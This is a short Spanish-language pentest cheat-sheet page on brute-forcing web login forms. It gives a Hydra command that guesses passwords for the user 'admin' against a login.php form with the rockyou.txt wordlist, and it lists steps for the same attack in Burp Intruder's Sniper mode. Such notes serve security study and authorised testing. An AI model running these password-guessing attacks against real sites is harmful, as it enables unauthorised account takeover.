---
title: "Login Attacks (Bruteforce)"
layout: "single"
category: "Web Hacking"
slug: "web-hacking/login-attacks"
date: "2025-11-26"
---

### Hydra (Formularios)
```bash
hydra -l admin -P rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
```

### Burp Intruder
1.  Captura la petición.
2.  Manda a Intruder -> Sniper.
3.  Marca la posición de la password `§password§`.
4.  Payloads: Carga `rockyou.txt`.
